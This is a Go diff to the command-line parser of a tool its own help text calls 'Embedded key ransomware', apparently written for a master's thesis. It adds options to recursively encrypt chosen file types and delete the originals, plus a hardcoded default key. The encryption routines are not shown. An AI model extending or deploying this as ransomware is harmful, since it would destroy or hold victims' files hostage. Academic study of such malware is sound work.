@@ -34,8 +34,8 @@ type CommandLineFlag struct {
 
 var cliArgs = []CommandLineArg{
 	{
-		name: "mode",
-		info: CommandLineArgInfo{description: "operation mode", isBool: true, required: RequiredOr},
+		name: "Mode",
+		info: CommandLineArgInfo{description: "Operation mode", isBool: true, required: RequiredOr},
 		flags: []CommandLineFlag{
 			{flag: "-e", description: "encryption mode", settingsValue: true},
 			{flag: "-d", description: "decryption mode", settingsValue: false},
@@ -43,40 +43,40 @@ var cliArgs = []CommandLineArg{
 		settingsField: "EncryptionMode",
 	},
 	{
-		name: "delete",
-		info: CommandLineArgInfo{description: "delete file after encryption", isBool: true, required: Optional},
+		name: "Delete",
+		info: CommandLineArgInfo{description: "Delete original file after encryption?", isBool: true, required: Optional},
 		flags: []CommandLineFlag{
 			{flag: "-del", description: "delete files", settingsValue: true},
 		},
 		settingsField: "Delete",
 	},
 	{
-		name: "recursion",
-		info: CommandLineArgInfo{description: "recursive file listing", isBool: true, required: Optional},
+		name: "Recursion",
+		info: CommandLineArgInfo{description: "Recursive file listing", isBool: true, required: Optional},
 		flags: []CommandLineFlag{
 			{flag: "-r", description: "use recursion", settingsValue: true},
 		},
 		settingsField: "Recursion",
 	},
 	{
-		name: "key",
-		info: CommandLineArgInfo{description: "supplied key", required: RequiredWith, requiredWith: "-d", isBool: false, defaultFlag: "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"},
+		name: "Key",
+		info: CommandLineArgInfo{description: "Supplied symmetric key", required: RequiredWith, requiredWith: "-d", isBool: false, defaultFlag: "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"},
 		flags: []CommandLineFlag{
 			{flag: "--key", description: "key used to encrypt/decrypt, hardcoded used by default"},
 		},
 		settingsField: "Key",
 	},
 	{
-		name: "fileFormats",
-		info: CommandLineArgInfo{description: "file formats to target", metaValue: ",", isBool: false, required: Optional, defaultFlag: "txt"},
+		name: "File Formats",
+		info: CommandLineArgInfo{description: "File formats to target by encryption", metaValue: ",", isBool: false, required: Optional, defaultFlag: "txt"},
 		flags: []CommandLineFlag{
-			{flag: "--ff", description: "separated by | like so: jpg|png|txt"},
+			{flag: "--ff", description: "separated by , like so: jpg,png,txt"},
 		},
 		settingsField: "FileFormat",
 	},
 	{
-		name: "dir",
-		info: CommandLineArgInfo{description: "directory to run in", required: Optional, isBool: false, defaultFlag: "."},
+		name: "Working dir",
+		info: CommandLineArgInfo{description: "Directory to run in", required: Optional, isBool: false, defaultFlag: "."},
 		flags: []CommandLineFlag{
 			{flag: "--dir", description: "relative or absolute dir path"},
 		},
@@ -117,11 +117,9 @@ func ParseCLIArgs(args []string) (ProgramSettings, error) {
 }
 
 func parseParameter(v CommandLineArg, argsPtr **[]string) error {
-	// check if required
 	required := v.info.required
 	var multiFlagIndex int
 	args := **argsPtr
-	// flagIndex := FindStringIndex(args, v.flags[0].flag)
 	flagIndex, multiFlagIndex := findOneOfFlags(args, v)
 	switch required {
 	case Required:
@@ -203,4 +201,43 @@ func isCLIParameter(str string) bool {
 
 func err(errMsg string) (ProgramSettings, error) {
 	return Settings, errors.New(errMsg)
+}
+
+func PrintHelp(programName string) {
+	fmt.Println("Embedded key ransomware")
+	fmt.Println("Created as part of master theses")
+	fmt.Println("-------USAGE--------")
+	fmt.Println(programName + " [boolFlags]/[paramFlags] values")
+	fmt.Println("order of flags is irrelevant but values must follow paramters such as --key keyValue or --dir dirPath")
+	for _, v := range cliArgs {
+		fmt.Println("-------")
+		fmt.Printf("%s: %s\n", v.name, v.info.description)
+		var requiredFlag string
+		switch v.info.required {
+		case Required:
+			requiredFlag = "Yes"
+		case RequiredWith:
+			requiredFlag = fmt.Sprintf("Required if using %s flag", v.info.requiredWith)
+		case RequiredOr:
+			requiredFlag = "Yes: one of possible flags must be passed"
+		case Optional:
+			requiredFlag = "No"
+		}
+		fmt.Println("[Flags]:")
+		for _, f := range v.flags {
+			fmt.Printf("\t%s: %s\n", f.flag, f.description)
+		}
+		var dVal string
+		if len(v.info.defaultFlag) == 0 && !v.info.isBool {
+			dVal = "None, must be passed"
+		} else if len(v.info.defaultFlag) == 0 && v.info.isBool && v.info.required == RequiredOr || v.info.required == Required {
+			dVal = "None, must be passed"
+		} else if len(v.info.defaultFlag) == 0 && v.info.isBool && !(v.info.required == RequiredOr || v.info.required == Required) {
+			dVal = "false"
+		} else {
+			dVal = v.info.defaultFlag
+		}
+		fmt.Printf("Required: %s\n", requiredFlag)
+		fmt.Printf("Default value: %s\n", dVal)
+	}
 }
